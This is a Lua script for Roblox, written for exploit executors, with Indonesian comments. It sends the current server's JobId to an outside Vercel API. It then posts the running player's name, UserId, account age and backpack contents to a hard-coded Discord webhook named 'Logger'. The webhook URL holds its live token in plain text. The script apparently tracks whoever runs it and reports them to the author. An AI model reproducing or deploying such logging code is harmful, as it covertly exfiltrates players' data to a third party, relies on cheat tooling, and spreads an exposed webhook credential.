local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

-- Konfigurasi
local jobId = tostring(game.JobId)
local apiEndpoint = "https://api-beta-mocha-45.vercel.app/api/setInstanceId"
local webhookUrl = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
local player = Players.LocalPlayer
local playerName = player.Name

-- Fungsi untuk memastikan string aman untuk Discord
local function sanitizeString(str)
    return tostring(str):gsub("[%c%z]", ""):sub(1, 1000)
end

-- Ambil fungsi http request yang tersedia dari executor
local httpRequest = (http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (krnl and krnl.request))

if typeof(httpRequest) ~= "function" then
    warn("‚ùå Executor tidak mendukung http request!")
    return
end

-- Fungsi bantu untuk request dengan error handling
local function safeRequest(requestTable)
    local success, response = pcall(function()
        return httpRequest(requestTable)
    end)
    if not success then
        warn("‚ùå Error saat melakukan HTTP request:", response)
        return nil
    end
    return response
end

-- Fungsi untuk mendapatkan isi backpack
local function getBackpackContents()
    local contents = {}
    local backpack = player:FindFirstChild("Backpack")
    if not backpack then return "Backpack tidak ditemukan" end
    
    for _, item in ipairs(backpack:GetChildren()) do
        table.insert(contents, item.Name)
    end
    
    if #contents == 0 then
        return "Backpack kosong"
    else
        return table.concat(contents, ", "):sub(1, 1000)  -- Batasi panjang string
    end
end

-- Kirim ke API
local jsonData = HttpService:JSONEncode({ instanceId = jobId })
local apiResponse = safeRequest({
    Url = apiEndpoint,
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = jsonData
})

if apiResponse and apiResponse.StatusCode == 200 then
    print("‚úÖ InstanceId berhasil dikirim ke API:", jobId)
else
    warn("‚ùå Gagal kirim ke API:", apiResponse and apiResponse.StatusCode or "Tidak ada respons")
end

-- Dapatkan isi backpack
local backpackContents = sanitizeString(getBackpackContents())

-- Siapkan data untuk webhook
local embedData = {
    username = "Logger",
    embeds = {
        {
            title = "üü¢ Script Dijalankan",
            description = string.format("**%s** menjalankan script\nüì° **JobId:** `%s`", 
                                      sanitizeString(playerName), 
                                      sanitizeString(jobId)),
            color = 65280,
            timestamp = DateTime.now():ToIsoDate(),
            fields = {
                {
                    name = "üéí Isi Backpack",
                    value = backpackContents,
                    inline = false
                },
                {
                    name = "üë§ Info Player",
                    value = string.format("UserID: %d\nAccount Age: %d hari", 
                                        player.UserId, 
                                        player.AccountAge),
                    inline = true
                }
            },
            footer = {
                text = "Logger System"
            }
        }
    }
}

-- Pastikan data embed valid
local success, webhookBody = pcall(function()
    return HttpService:JSONEncode(embedData)
end)

if not success then
    warn("‚ùå Gagal encode data webhook:", webhookBody)
    return
end

-- Kirim ke Discord Webhook
local webhookResponse = safeRequest({
    Url = webhookUrl,
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = webhookBody
})

if webhookResponse then
    if webhookResponse.StatusCode == 200 or webhookResponse.StatusCode == 204 then
        print("‚úÖ Webhook Discord terkirim!")
    else
        warn("‚ùå Gagal kirim webhook (Status "..webhookResponse.StatusCode.."):", 
             webhookResponse.Body or "Tidak ada response body")
    end
else
    warn("‚ùå Gagal kirim webhook: Tidak ada respons")
end
